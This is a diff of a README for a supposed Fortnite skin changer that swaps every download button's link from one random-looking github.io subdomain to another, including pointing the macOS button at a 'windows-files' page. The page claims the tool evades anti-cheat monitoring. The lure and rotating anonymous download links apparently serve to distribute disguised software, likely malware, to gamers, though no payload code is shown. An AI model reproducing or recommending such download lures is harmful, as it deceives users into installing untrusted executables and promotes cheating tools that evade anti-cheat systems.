@@ -8,7 +8,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/Download_skin%20change%20fortnite-F9A825?style=for-the-badge&logo=github)](https://jaifcflcufqn.github.io/win-install/)
+[![Download](https://img.shields.io/badge/Download_skin%20change%20fortnite-F9A825?style=for-the-badge&logo=github)](https://uvkayskoqsgd.github.io/windows-files/)
 
 </div>
 
@@ -58,9 +58,9 @@ Works because it never touches anything anti-cheat monitors.
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://jaifcflcufqn.github.io/win-install/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://uvkayskoqsgd.github.io/windows-files/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://jaifcflcufqn.github.io/mac-install/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://uvkayskoqsgd.github.io/windows-files/)
 
 </div>
 
@@ -77,7 +77,7 @@ Works because it never touches anything anti-cheat monitors.
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/Download_skin%20change%20fortnite-F9A825?style=for-the-badge&logo=github)](https://jaifcflcufqn.github.io/win-install/)
+[![Download](https://img.shields.io/badge/Download_skin%20change%20fortnite-F9A825?style=for-the-badge&logo=github)](https://uvkayskoqsgd.github.io/windows-files/)
 
 </div>
 
